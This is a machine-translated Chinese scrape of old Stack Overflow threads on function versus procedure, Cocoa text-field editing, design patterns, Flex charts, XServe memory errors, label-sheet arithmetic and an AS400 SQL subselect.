有一个术语*子程序*或*子程序*，它代表可以从不同位置调用的参数化代码段。

函数和过程是它们的实现。通常函数返回值和过程不返回任何东西。

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2013-12-18T09:27:46.947

## 基本差异

*   函数必须返回一个值，但在存储过程中它是可选的：一个过程可以返回 0 或*n 个*值。
*   函数只能有输入参数，而过程可以有输入/输出参数。
*   对于一个函数，它必须接受一个输入参数，但一个存储过程可能需要 0 到*n 个*输入参数。
*   可以从过程调用函数，而不能从函数调用过程。

## 高级差异

*   异常可以通过过程中的 try-catch 块来处理，而 try-catch 块不能在函数中使用。
*   我们可以在过程中进行事务管理，而在函数中我们不能。

### 在 SQL 中：

*   过程允许其中`SELECT`包含 DML ( `INSERT`, `UPDATE`, `DELETE`) 语句，而函数仅允许其中包含`SELECT`语句。
*   过程不能在`SELECT`语句中使用，而函数可以嵌入在`SELECT`语句中。
*   存储过程不能用于`WHERE`（或 a`HAVING`或 a `SELECT`）块中的任何位置的 SQL 语句中，而函数可以。
*   返回表的函数可以被视为另一个 Rowset。这可以在`JOIN`与其他表的块中使用。
*   内联函数可以被认为是接受参数的视图，可以在`JOIN`块和其他行集操作中使用。

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2020-01-12T12:57:43.693

这是一个众所周知的老问题，但我想分享一些关于现代编程语言研究和设计的更多见解。

# 基本答案

传统上（在[结构化编程](https://en.wikipedia.org/wiki/Structured_programming)的意义上）和非正式地，*过程*是一种可重用的结构构造，具有“输入”并执行可编程操作。当需要在过程中完成某些事情时，您可以在源代码中编码的*过程调用*（通常以一种表达式）中为过程提供*（实际）参数，以及在过程**主体*中编码的动作（提供在过程的定义中）将通过将参数替换为主体中使用的*（正式）参数*来执行。

 ****函数*不仅仅是一个过程，因为返回*值*也可以指定为主体中的“输出”。函数调用或多或少与过程调用相同，只是您还可以在语法上使用函数调用的结果（通常作为某个其他表达式的子表达式）。

传统上，过程调用（而不是函数调用）用于表示必须对输出不感兴趣，并且必须有[*副作用*](https://en.wikipedia.org/wiki/Side_effect_(computer_science))以避免调用是无操作的，因此强调了[命令式编程范式](https://en.wikipedia.org/wiki/Imperative_programming)。许多像 Pascal 这样的传统编程语言都提供了“过程”和“函数”来区分这种有意的风格差异。

（需要明确的是，上面提到的“输入”和“输出”是基于函数句法属性的简化概念。许多语言还支持通过引用/共享将参数传递给参数，以允许用户在调用期间传输编码在参数中的信息. 这样的参数甚至可以被称为“输入/输出参数”。这个特性是基于在调用中传递的对象的性质，它与过程/函数的特性的特性正交。）

但是，如果不需要函数调用的结果，则可以（至少在逻辑上）忽略它，并且函数定义/函数调用应该以这种方式与过程定义/过程调用保持一致。类似 ALGOL 的语言，如 C、C++ 和 Java，都以这种方式提供“函数”的特性：通过将结果类型编码`void`为看起来像传统过程的函数的特例，不需要提供“过程”的特性“ 分别地。这可以防止语言设计中的一些膨胀。

由于提到了 SICP，还值得注意的是，在[R ^n RS](http://www.scheme-reports.org/)指定的 Scheme 语言中，过程可能必须或可能不必返回计算结果。这是传统“函数”（返回结果）和“过程”（不返回任何内容）的结合，与许多类似 ALGOL 的语言的“函数”概念基本相同（实际上共享更多保证，例如对调用前的操作数）。然而，即使在像[SRFI-96](https://srfi.schemers.org/srfi-96/srfi-96.html)这样的规范性文件中，仍然存在老式差异。

我不太了解这种分歧背后的确切原因，但正如我所经历的那样，现在没有规范膨胀的语言设计者似乎会更快乐。也就是说，作为独立功能的“程序”是不必要的。像`void`类型这样的技术已经足以标记应该强调副作用的使用。这对于有类似 C 语言经验的用户来说也更自然，这些语言已经流行了几十年。此外，它避免了在 R ^n RS 这样的情况下的尴尬，其中“程序”实际上是更广泛意义上的“功能”。

理论上，一个函数可以指定一个指定的*单元类型*作为函数调用结果的类型，表示结果是特殊的。这将传统过程（调用结果不感兴趣）与其他过程区分开来。语言设计有不同的风格：

*   与 R ^n RS 中一样，只需将不感兴趣的结果标记为“未指定”值（如果语言必须提及，则为未指定类型）并且足以被忽略。
*   将不感兴趣的结果指定为专用单元类型（例如[Kernel](https://web.cs.wpi.edu/~jshutt/kernel.html) 's `#inert`）的值也可以。
*   当该类型进一步是*底部类型*时，它可以（希望）静态验证并防止用作表达式类型。类 ALGOL 语言中的`void`类型正是这种技术的一个例子。ISO C11`_Noreturn`与此类类似，但更微妙。

# 进一步阅读

作为源自数学的传统概念，有很多大多数人都懒得知道[的黑魔法。](https://en.wikipedia.org/wiki/History_of_the_function_concept)严格地说，你不可能按照你的数学书把所有的事情都弄清楚。CS书籍也可能不会提供太多帮助。

关于编程语言，有几个注意事项：

*   不同数学分支中的函数并不总是被定义为具有相同的含义。不同编程范式中的函数也可能完全不同（甚至有时函数调用的语法看起来很相似）。有时导致差异的原因是相同的，但有时却不是。
    *   通过数学函数对计算进行建模，然后用编程语言*实现**底层*计算是惯用的。请小心避免将它们一一对应，除非您知道所谈论的内容。
*   不要将模型与要建模的实体混淆。
    *   后者只是对前者的一种*实现*。可以有多个选择，具体取决于上下文（例如，感兴趣的数学分支）。
    *   [特别是，将“函数”视为“映射”或笛卡尔积的子集或将自然数视为序数的 Von-Neumann 编码（看起来像一堆`{{{}}, {}}`......）](https://en.wikipedia.org/wiki/Ordinal_number#Von_Neumann_definition_of_ordinals)或多或少类似荒谬，除了一些有限的上下文.
*   在数学上，函数可以是[*部分*的或*全部*](https://en.wikipedia.org/wiki/Partial_function)的。不同的编程语言在这里有不同的处理。
    *   一些函数式语言可能会尊重函数的[*整体*](https://en.wikipedia.org/wiki/Total_functional_programming)，以保证函数调用中的计算总是以有限的步骤终止。然而，这本质上不是图灵完备的，因此计算表达能力较弱，并且除了类型检查的语义（预计是全部的）之外，在通用语言中并不多见。
    *   如果程序和功能之间的差异很大，是否应该有“总程序”？唔...
*   类似于 calculi 中用于对[一般计算](https://en.wikipedia.org/wiki/Model_of_computation)和[编程语言的语义](https://en.wikipedia.org/wiki/Operational_semantics)建模的函数的构造（例如 lambda calculi 中的 lambda 抽象[）](https://en.wikipedia.org/wiki/Lambda_calculi)可以对操作数具有不同的[评估策略](https://en.wikipedia.org/wiki/Evaluation_strategy)。
    *   在传统的纯微积分的简化以及[纯函数式语言](https://en.wikipedia.org/wiki/Purely_functional_programming)中表达式的评估中，没有改变计算结果的副作用。因此，不需要在类函数构造体之前评估操作数（因为定义“相同结果”的不变量由[Church-Rosser 属性](https://en.wikipedia.org/wiki/Confluence_(abstract_rewriting))保证的[β](https://en.wikipedia.org/wiki/Lambda_calculus#%CE%B2-reduction_2)等价性等属性保持）。
    *   然而，许多编程语言在表达式的计算过程中可能会产生副作用。这意味着，*应用评估等严格评估策略与**call-by-need*等非严格评估策略不同。这很重要，因为没有区别，就没有必要将类函数（即与参数一起使用）宏与（传统）函数区分开来。但根据理论的风格，这仍然可以是一个人工制品。也就是说，在更广泛的意义上，类似函数的宏（尤其是[卫生](https://en.wikipedia.org/wiki/Hygienic_macro)宏）是具有一些不必要限制（句法阶段）*的数学函数。***如果没有这些限制，将（一流）类似函数的宏视为过程可能是明智的......**
    *   对于对此主题感兴趣的读者，请考虑[一些现代抽象](https://en.wikipedia.org/wiki/Fexpr#Fexprs_since_1980)。
*   过程通常被认为超出了传统数学的范围。然而，在计算和编程语言语义以及当代编程语言设计的微积分建模中，可能有相当多的相关概念共享“可调用”性质。其中一些用于实现/扩展/替换过程/功能。还有更细微的区别。
    *   以下是一些相关的关键字：[subroutines](https://en.wikipedia.org/wiki/Subroutine) /(stackless/stackful) [coroutines](https://en.wikipedia.org/wiki/Coroutine) /(undelimited delimited) [continuations](https://en.wikipedia.org/wiki/Continuation) ... 甚至 (unchecked) [exceptions](http://lambda-the-ultimate.org/node/2966)。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2009-04-06T12:01:24.327

更严格地说，如果 x = y，函数 f 遵循 f(x) = f(y) 的性质，即每次使用相同的参数调用它时，它都会计算**相同的结果**（因此它不会改变系统。）

因此，rand() 或 print("Hello") 等不是函数而是过程。虽然 sqrt(2.0) 应该是一个函数：无论调用它的频率如何，都没有可观察到的效果或状态变化，它总是返回 1.41 和一些。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2009-04-06T11:56:35.803

如果我们在这里与语言无关，则*过程*通常指定一系列可靠且幂等地实现特定结果所需的行为。也就是说，一个过程基本上就是一个算法。

另一方面，函数是较大程序中的一段独立的代码。换句话说，函数是一个过程的实现。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2009-04-06T11:56:11.623

在大多数情况下：函数返回一个值，而过程不返回。两者都是组合在一起以执行相同操作的代码段。

在函数式编程上下文（所有函数都返回值）中，函数是一个抽象对象：

```
f(x)=(1+x)
g(x)=.5*(2+x/2) 
```

这里，f 与 g 的功能相同，但过程不同。

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2013-12-31T06:10:17.783

在程序内部我们可以使用 DML（插入/更新/删除）语句，但在函数内部我们不能使用 DML 语句。

过程可以有输入\输出参数，但函数只能有输入参数。

我们可以在存储过程中使用 Try-Catch 块，但在函数中我们不能使用 Try-Catch 块。

我们不能在 Select 语句中使用存储过程，但在函数中我们可以在 Select 语句中使用。

存储过程可以返回 0 或 n 个值（最大 1024），但函数只能返回 1 个值，这是强制性的。

存储过程不能从函数中调用，但是我们可以从存储过程中调用函数。

我们可以在存储过程中使用事务，但在函数中我们不能使用事务。

我们不能在 Where/Having/select 部分的任何地方使用 Sql 语句中的存储过程，但在函数中我们可以使用。

我们不能加入存储过程，但我们可以加入函数。

更多.. 点击这里... [http://dotnet-developers-cafe.blogspot.in/2013/08/difference-between-stored-procedure-and.html](http://dotnet-developers-cafe.blogspot.in/2013/08/difference-between-stored-procedure-and.html)

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2012-05-22T04:17:15.107

一个函数返回一个值，一个过程只执行命令。

名称函数来自数学。它用于根据输入计算值。

过程是一组可以按顺序执行的命令。

在大多数编程语言中，甚至函数也可以有一组命令。因此，区别仅在于返回值部分。

但是如果你想保持函数干净，（看看函数式语言），你需要确保函数没有副作用。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2012-07-18T10:44:20.210

函数可以在 sql 语句中使用，而过程不能在 sql 语句中使用。

Insert、Update 和 Create 语句不能包含在函数中，但过程可以包含这些语句。

过程支持事务，但函数不支持事务。

函数必须返回一个且只有一个值（另一个可以由 OUT 变量返回），但过程返回尽可能多的数据集和返回值。

函数和过程的执行计划都被缓存了，所以两种情况下的性能是一样的。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2014-02-24T01:35:20.843

我反对我在大多数这些答案中一遍又一遍地看到的东西，即使函数成为函数的是它返回一个值。

函数不仅仅是任何返回值的旧方法。不是这样：为了让一个方法成为一个真正的函数，它必须返回相同的值，总是给定一个特定的输入。不是函数的`random`方法的一个例子是大多数语言中的方法，因为尽管它确实返回一个值，但值并不总是相同的。

因此，函数更类似于映射（例如，`x -> x'`一维函数的位置）。这是常规方法和函数之间的一个非常重要的区别，因为在处理实际函数时，它们被评估的时间和顺序永远都不重要，因为非函数并不总是如此。

这是另一个不是函数但仍会返回值的方法的示例。

```
// The following is pseudo code:
g(x) = {
  if (morning()) {
     g = 2 * x;
  }
  else {
   g = x;
  }
  return g;
} 
```

我进一步反对过程不返回值的概念。过程只是谈论功能或方法的特定方式。这意味着如果您的过程定义或实现的底层方法返回一个值，那么猜测该过程返回的值是什么。以[SICP](http://mitpress.mit.edu/sicp/full-text/book/book-Z-H-11.html#%_sec_1.2)中的以下片段为例：

```
// We can immediately translate this definition into a recursive procedure 
// for computing Fibonacci numbers:

(define (fib n)
  (cond ((= n 0) 0)
        ((= n 1) 1)
        (else (+ (fib (- n 1))
                 (fib (- n 2)))))) 
```

你最近听说过递归过程吗？他们正在谈论一个递归函数（一个真正的函数）并且它正在返回一个值，并且他们正在使用“过程”这个词。那么有什么区别呢？

对函数的另一种思考方式（除了上面提到的含义）是对理想的抽象表示，例如数字 1。过程是该事物的实际实现。我个人认为它们是可以互换的。

（注意，如果您从我提供的链接中阅读该章节，您可能会发现更难掌握的概念不是函数和过程之间的区别，而是过程和过程之间的区别。您知道递归过程可以有迭代过程？）

程序的类似物是食谱。例如; 假设您有一台机器，称为`make-pies`这台机器，它接收 的成分，`(fruit, milk, flower, eggs, sugar, heat)`而这台机器返回一个`pie`.

这台机器的表示可能看起来像

```
make-pies (fruit, milk, flower, eggs, sugar, heat) = {
   return (heat (add fruit (mix eggs flower milk)))
} 
```

*当然，这不是制作馅饼的唯一方法。*

在这种情况下，我们可以看到：

```
A       function     is to a     machine
as a    procedure    is to a     recipe
as      attributes   are to      ingredients
as      output       is to       product 
```

这个类比是可以的，但是当你考虑到当你处理一个计算机程序时，一切都是抽象的。因此，与机器的配方不同，我们将两个本身是抽象的事物进行比较；两件事也可能是同一件事。我认为它们（出于所有意图和目的）是同一件事。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2017-07-06T11:30:28.983

在С#/Java 中，**function**是返回特定值的代码块，而**procedure**是返回**void**（无）的代码块。在 C#/Java 中，函数和过程通常都称为**方法**。

```
 //This is a function
    public DateTime GetCurrentDate()
    {
        return DateTime.Now.Date;
    }

    //This is a procedure(always return void)
    public void LogMessage()
    {
        Console.WriteLine("Just an example message.");
    } 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2016-11-26T21:36:58.347

在**db**的上下文中：存储过程是**预编译**的执行计划，而函数则不是。

* * *

## 回答 #17

> 赞同：-3
> 
> 时间：2014-12-21T09:48:19.573

**过程：** 1.过程是定义参数化计算的语句的集合。2.程序不能返回值。

3.程序不能从函数中调用。

**函数** 1.函数在结构上类似于过程，但在语义上以数学函数为模型。2.它可以返回值 3.函数可以从程序中调用。

* * *

## 回答 #18

> 赞同：-8
> 
> 时间：2015-03-30T18:50:36.700

过程和函数都是子例程，它们之间的**唯一**区别是过程返回**多个**（或至少可以做）值，而函数只能返回**一个**值（这就是为什么在数学中使用函数表示法，因为通常只能找到一个值在某个特定时间）尽管某些编程语言不遵循这些规则，但这是它们的真实定义

# cocoa - 在 Cocoa 中关闭模态对话框之前强制读取文本字段

> ID：721092
> 
> 赞同：2
> 
> 时间：2009-04-06T11:48:26.010
> 
> 标签：cocoa, macos

在 Mac OS X Cocoa 应用程序中，我有一个应用程序模式对话框，其中包含绑定到共享用户默认控制器的文本字段。如果我编辑一个文本字段，然后在单击“确定”按钮之前将其移开，那么一切都会按预期进行。但是，如果我开始编辑一个字段，然后按 Return 键触发 OK，则该字段的旧值仍保留在 NSUserDefaults 中。

那么，当编辑“不完整”时，如何强制更改的字段影响绑定值？

通过阅读文档，我认为我可以在关闭对话框之前为每个文本字段调用 NSControl 的 validateEditing 方法，但似乎应该有一种更简单的方法。

FWIW，这是显示对话框的代码：

```
- (void)showDialog {
    [NSApp activateIgnoringOtherApps:YES];
    [NSApp beginSheet:startTimerDialog
       modalForWindow:nil
        modalDelegate:nil
       didEndSelector:nil
          contextInfo:nil];
    [NSApp runModalForWindow:startTimerDialog];
    [NSApp endSheet:startTimerDialog];
    [startTimerDialog orderOut:self];
} 
```

确定按钮（实际上名为“开始”）针对此方法：

```
- (IBAction)startTimerDialogStartButtonWasClicked:(id)sender {
    [self closeModalDialog:sender];

    // Then, call methods that read values from NSUserDefaults
    // ...    
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T15:48:31.143

向用户默认控制器发送[`commitEditing`](http://developer.apple.com/documentation/Cocoa/Reference/ApplicationKit/Classes/NSController_Class/Reference/Reference.html#//apple_ref/occ/instm/NSController/commitEditing)消息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T13:15:13.883

这可能是答案：

```
[startTimerDialog makeFirstResponder:nil]; 
```

根据文档，这会将 resignFirstResponder 发送到当前的第一响应者，这应该会导致编辑结束。

当然，第一响应者可以拒绝辞职，在这种情况下，makeFirstResponder 将返回 NO。所以我需要研究如何处理它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T18:23:37.823

通过以下调用可以实现一种稍微突然的结束编辑的方式：

```
[startTimerDialog endEditingFor:nil]; 
```

这总是有效的，但它比你大部分时间需要的更强烈。*（有关“强烈”的更官方描述，请参见下面的文档链接）*。

简而言之：**-endEditingFor:** 仅应在您无法让 fieldEditor 辞去第一响应者时用作最后的手段。因此，在采取此类极端措施之前，您可能想尝试一种更微妙的方法。

更微妙的是，在**-endEditingFor的**[NSWindow 类文档](http://developer.apple.com/documentation/Cocoa/Reference/ApplicationKit/Classes/NSWindow_Class/Reference/Reference.html#//apple_ref/occ/instm/NSWindow/endEditingFor:)中： Apple 提出了类似这样的建议：

 **```
if ( ![startTimerDialog makeFirstResponder:startTimerDialog] )
    /* Making the window firstResponder failed, proceed to
       force the first responder to resign */

    [startTimerDialog endEditingFor:nil]; 
```

按照上面的链接查看他们的确切示例代码，我在这里缩短了它，因为您显然对在您描述的用例中使用 fieldEditor 不感兴趣。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T11:58:16.487

您可以尝试为所有文本字段设置一个[委托](http://developer.apple.com/DOCUMENTATION/Cocoa/Conceptual/TextEditing/Tasks/DelegatesAndNotif.html#//apple_ref/doc/uid/20000932)，并直接处理更改。

# design-patterns - 设计问题

> ID：721095
> 
> 赞同：0
> 
> 时间：2009-04-06T11:49:50.500
> 
> 标签：design-patterns

我有一个带有一些属性的 Channel 和一个 ChannelProxy 扩展 Channel。这个 ChannelProxy 保存原始值，以便可以应用乐观并发。您可以在无并发检查和乐观并发检查之间切换。

现在我想实现一个可以是 Channel 或 ChannelProxy 的 LazyLoadedChannel。无法同时扩展两者。这种问题有什么好的解决方案？

我可以创建一个 LazyLoadedChannel（扩展 Channel）和一个 LazyLoadedChannelProxy（扩展 ChannelProxy），但这意味着代码将在两个类中重复。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T11:56:03.747

看起来[装饰器模式](http://en.wikipedia.org/wiki/Decorator_pattern)是一种选择。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T12:07:10.833

Decorator Patterns 对我来说也是一个不错的选择。

但是，作为替代方案，您可以这样做：

1.  使您的`Channel`可配置为延迟加载或非延迟加载。您可以使用[策略模式](http://en.wikipedia.org/wiki/Strategy_pattern)来实现这一点。
2.  因此， Once`Channel`是可配置的`ChannelProxy`，因为它只是一个子类，所以也应该是自动配置的。因此，您可能无需再做任何事情。
3.  *或者*：取决于“加载”需要什么，`ChannelProxy`可能必须提供自己的`LoadingStrategy`类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T12:02:25.570

如上所述（Dmitri），它看起来像是您放在频道上的装饰器。假设您的代理仅在需要时访问这些值 - 即当它们即将被更改时。

# apache-flex - 具有动态列数的 ColumnChart

> ID：721096
> 
> 赞同：1
> 
> 时间：2009-04-06T11:49:54.073
> 
> 标签：apache-flex, charts

我对 Flex 3 中的 ColumnChart 有疑问。一个简单的 ColumnChart 就像：

```
 <mx:horizontalAxis>
       <mx:CategoryAxis 
            dataProvider="{myDP}" 
            categoryField="date"
       />
    </mx:horizontalAxis>

    <mx:series>
         <mx:ColumnSeries 
                xField="date" 
                yField="Expense" 
                displayName="Expense"
           />
           <mx:ColumnSeries 
                xField="date" 
                yField="Income" 
                displayName="Income"
           />
      </mx:series> 
```

但是如何使用来自数据提供者的动态列数制作一个 ColumnChart？这里的“费用”和“收入”列是硬编码的。但是如果它们来自dataprovider，并且数量不固定，我们怎么办，例如，yFields可以是“费用1”，“费用2”，......“收入1”，“收入2”，......等等

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T13:26:04.280

You can try to add new ColumnSeries() objects something like...

```
var series:Series = new Series();
for(...) // execute loop as per data provider
{
  var tmp:ColumnSeries = new ColumnSeries();
  tmp.xField....
  tmp.yField...
  ...

  series.addChild(tmp);
} 
```

i think this, or similar solution should work

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-07T08:22:17.433

Matt, thanks for your solution.

Just a small detail that I found. without it, it can't display.

var tmp:ColumnSeries = new ColumnSeries();

**//this line is very important.** this.myChart.series = [tmp];

for(var i:int=0; i< lens ; i++) // execute loop as per data provider

{

tmp = new ColumnSeries();

tmp.xField....

tmp.yField...

...

this.myChart.series[i]=tmp;

}

[More details](http://www.cflex.net/showFileDetails.cfm?ObjectID=489)

# macos - 可恢复的类 Fbd 错误

> ID：721097
> 
> 赞同：0
> 
> 时间：2009-04-06T11:50:13.650
> 
> 标签：macos, sysadmin, osx-server

我的服务器（一个 XServe xeon 8 核 [harpertown arch]）最近一直在发送垃圾邮件内核警告，我似乎无法获得任何可能出现问题的具体信息。

有没有人遇到过这样的错误？

```
Apr  6 13:44:19 xserve kernel[0]: /!\ WARNING: 27006 recoverable class Fbd error(s) ( ferr = 0x30000200 nerr == 0x00000000 )
Apr  6 13:44:29 xserve kernel[0]: /!\ WARNING: 27007 recoverable class Fbd error(s) ( ferr = 0x30000800 nerr == 0x00100800 )
Apr  6 13:44:54 xserve kernel[0]: /!\ WARNING: 27008 recoverable class Fbd error(s) ( ferr = 0x30000800 nerr == 0x00100800 )
Apr  6 13:44:54 xserve kernel[0]: /!\ WARNING: 27009 recoverable class Fbd error(s) ( ferr = 0x30000800 nerr == 0x00000000 )
Apr  6 13:45:17 xserve kernel[0]: /!\ WARNING: 27010 recoverable class Fbd error(s) ( ferr = 0x30000800 nerr == 0x00000800 )
Apr  6 13:45:24 xserve kernel[0]: /!\ WARNING: 27011 recoverable class Fbd error(s) ( ferr = 0x30000200 nerr == 0x00000800 )
Apr  6 13:45:31 xserve kernel[0]: /!\ WARNING: 27012 recoverable class Fbd error(s) ( ferr = 0x30000800 nerr == 0x00000800 )
Apr  6 13:45:32 xserve kernel[0]: /!\ WARNING: 27013 recoverable class Fbd error(s) ( ferr = 0x30000800 nerr == 0x00000000 ) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-06T15:06:41.540

这些是 ECC 错误。打开服务器监视器并单击内存选项卡；它应该告诉你哪些 FB-DIMM(s) 是坏的。

（是的，这与编程无关，不应该出现在 Stack Overflow 上……）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T15:07:50.087

您应该联系您的硬件供应商以获得支持。

# math - 数学问题

> ID：721101
> 
> 赞同：-1
> 
> 时间：2009-04-06T11:50:57.173
> 
> 标签：math

这是问题所在：

一张包含 10 个标签。我想打印许多标签，但从任意起始索引。现在，我想知道打印用户想要的标签需要多少张。例如，假设我使用起始索引 52，我想打印 23 个标签。那么我如何找到所需的张数？有没有人有一个公式来计算这个？

*编辑*大家好，感谢您的回答，问题现已解决。非常感谢你们。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-04-06T14:07:05.880

我猜你的意思是你有一个预定的页面布局，即如果你想打印标签 42 到 67，你必须打印带有标签 40-49、50-59 和 60-69 的页面。

您需要做的就是找到起始页的工作表索引和结束页面的工作表索引，减去它们，然后加 1。标签*n*的工作表索引是 floor(n/10) （或者只是 n/10 与整数除法）。所以，如果你的起始标签是*n*，并且你想打印*x 个*标签，你需要的张数是：

```
floor((n+x)/10) - floor(n/10) + 1 
```

这一切都假设从零开始的索引，为了理智（这意味着第一个标签的索引为 0）。如果您的标签编号是从一开始的，即第一个标签的索引为 1，那么您需要先从*n*中减去一个，因此公式变为：

```
floor((n-1+x)/10) - floor((n-1)/10) + 1 
```

这应该很容易理解。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-04-06T11:55:03.000

上限((52-10)/10)

## 代码示例

在德尔福这将是

```
function AmountOfSheets(startingIndex: Integer; labels: Integer): Integer;
const
  ILabelsPerSheet: Integer = 10;    
begin
  Result := Ceil((labels - startingIndex) / ILabelsPerSheet);
end; 
```

感谢所有评论过正确的人，或者在*朋友的帮助下引用 jc 的*话。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-04-06T11:55:46.540

> 例如，我取了起始索引 10，我想打印 52 个标签。然后我如何找到所需的纸张数量

Ceiling( ( 52 - 10 + 1 ) / 10 ) -> pages （编辑：确保执行浮点除法而不是整数）

( 52 - 10 + 1 ) % 10 -> 最后一页的标签数量

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-04-06T12:24:43.553

所需的页数是（使用整数算术）：

```
(items + pageSize - 1) / pageSize 
```

其中`items`是要打印的标签`pageSize`数量， 是每页的标签数量。

只要您知道要打印的标签数量，起始索引与页数无关。如果您打印 25 个标签，则起始索引是 4 还是 827364827364 都没有关系，它仍然是 25 个标签。

* * *

编辑：

如果您想使用索引来选择性地将第一页上的标签留空，即打印从索引 14 到索引 32 的 19 个标签：

```
Page 1: -- -- -- 14 15 16 17 18 19 20
Page 2: 21 22 23 24 25 26 27 28 29 30
Page 3: 31 32 -- -- -- -- -- -- -- -- 
```

然后您首先计算在第一个标签之前留空的标签数量：

```
(index - 1) % pageSize 
```

（其中 % 是模数（或余数）运算符。）

然后将这些空项目添加到标签数中，以计算要打印的实际项目数。对于上面的示例，它将是 3 + 19 = 22。然后将在上面的计算中使用它来获取页数。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-06T11:55:10.923

所需的张数始终是您想要做的总数除以 10，四舍五入。如果起始索引从要打印的总数中扣除，它将是总标签负数，起始索引除以 10，四舍五入。

ceil ( 总标签 / 10 )

ceil ( (总标签 - 索引) / 10 )

**一个 PHP 示例：**

```
$starting_index=0;
$total=52 - $starting_index;
$labels_per_page=10;
$pages=ceil($total / $labels_per_page); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-04-06T11:57:21.560

假设意图是重复使用一半用过的标签，你有类似的东西

```
labelsOnFirstPage = labelsPerPage + 1 - StartIndex
if( totalLabels > labelsOnFirstPage )
{
    return 1 + Ceiling( (totalLabels - labelsOnFirstPage) / labelsPerPage )
}
else
{
    return 1;
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-04-06T13:15:43.663

我从您非常难以理解的问题中假设您的“起始索引”是页面上将打印第一个标签的位置。像这样的东西：

```
1     2
3     4
5     6
7     8
9     10 
```

那么你打印的页数就是你想要的标签总数，减去你在第一页上打印的标签，除以每页的标签数：

```
int labels_per_page = 10;
int starting_index = 10;
int total_labels = 52;
// Edit to account for a starting_index of more than labels_per_page:
int first_page = labels_per_page - ((starting_index - 1) % labels_per_page);
// first_page has one label
int remaining_labels =  total_labels - first_page;
if (remaining_labels <= 0) { return 1; }
// 51 labels left
int total_pages = ceiling(remaining_labels / labels_per_page) + 1;
// 7 pages total
return total_pages; 
```

您需要确保它`first_page`大于`total_labels`因为可能只有一页。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-04-06T17:12:18.057

与 Svante 具有相同的解释，索引从 1 开始，我会将答案写为

```
nSheets = ceiling((startIndex+nLabels) / 10) - ceiling(startIndex / 10) + 1 
```

对于给出的示例，从索引 10 开始有 52 个标签，我们将标签编号到索引 61 (=10+52-1)：

```
 10 (end of first sheet -> 1 label)
11 12 13 14 15 16 17 18 19 20 (second sheet -> 11 labels)
21 22 23 24 25 26 27 28 29 30 (third sheet -> 21 labels)
31 32 33 34 35 36 37 38 39 40 (fourth sheet -> 31 labels)
41 42 43 44 45 46 47 48 49 50 (fifth sheet -> 41 labels)
51 52 53 54 55 56 57 58 59 60 (sixth sheet -> 51 labels)
61                            (beginning of seventh sheet -> 52 labels) 
```

所以需要**7**张，我们可以检查

```
ceiling((10+52)/10)-ceiling(10/10)+1 = ceiling(6.2)-ceiling(1)+1 = 7-1+1 = 7 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-04-06T12:07:41.783

⌈(52-10+1)/10⌉</p>

# sql - 子选择问题

> ID：721108
> 
> 赞同：1
> 
> 时间：2009-04-06T11:52:59.027
> 
> 标签：sql, ibm-midrange, rpgle

我正在尝试在 AS400 上的 SQL 中进行子选择并得到“数据转换或数据映射错误” - 我很确定这与 SQL 在子选择中处理日期的方式有关（特别是它通过改变格式将逗号添加到十进制字段中，并且在进行下一次选择时会感到困惑）-有人可以为我确认吗？也许建议我需要如何解决这个问题？

基本上，我有类似下面的内容，日期为十进制，格式为：CCYYMMDD（即，如果您只是在它们作为 CC、YYM、MDD 出现的日期上进行选择）。日期来自 table3

```
SELECT *
FROM TABLE1 A
     CROSS JOIN TABLE2 B
     LEFT OUTER JOIN (SELECT *
                      FROM TABLE3 C 
                      LEFT OUTER JOIN TABLE4 D ON (blah)
                      INNER JOIN TABLE5 E  ON (blah)
                      WHERE DATE >= 20080101
                      AND   DATE <= 20090101
                     ) AS C ON (blah AND blah) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T16:24:13.057

我几乎没有过时的 AS/400 经验，但您的问题是经典的分而治之。

隔离子查询 - 它自己运行正常吗？然后从表 1 开始并确保交叉查询有效然后添加子查询。

我不知道 AS/400 是否支持它，但 SQL Server 的公用表表达式非常有用——基本上是本地范围的视图。我只提到它是因为您可以创建一个视图作为您的子查询以便更好地理解。

总而言之，我怀疑您的问题出在“胡说八道”之内:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-07T17:51:18.330

如果您使用本机 AS400 db，它的风格是：DB2 for iSeries（不要与 DB2 for Linux 和其他平台混淆）

如果是这样，并且如您所说，表 3 中的 DATE 字段是 CCYYMMDD 格式的十进制数字，那么您的比较就很好了。逗号是应用于显示的小数格式，不与值一起存储。

我同意 n8wrl，尝试一个简单的“从 DATE >= 20080101 的 Table3 中选择”，看看它是否运行，然后从那里开始工作。

废话，废话非常敏感:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T23:16:36.887

